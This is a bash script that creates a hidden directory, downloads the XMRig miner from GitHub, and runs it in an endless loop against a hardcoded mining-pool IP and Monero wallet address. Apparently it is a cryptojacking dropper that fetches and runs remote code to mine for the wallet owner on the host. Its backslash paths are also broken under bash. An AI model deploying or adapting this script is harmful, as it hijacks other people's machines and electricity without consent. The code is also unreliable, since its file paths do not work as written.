#!/bin/bash
mkdir .xm
wget -O .xm\xmrig.tar.gz  https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
tar -xzf .xm\xmrig.tar.gz
while [ true ]
do
  .xm\xmrig-6.20.0\xmrig -o 44.196.193.227:10128 -p h1 -u 46xgJzzbpiEXtzzxFFokaq32QAx1UCekBEMjDcGD6uBVHMXaqhGqmrnUCASr8Fa7KRF5n35Rkrt3TedjB6yqF1qUMMVTsCr
done
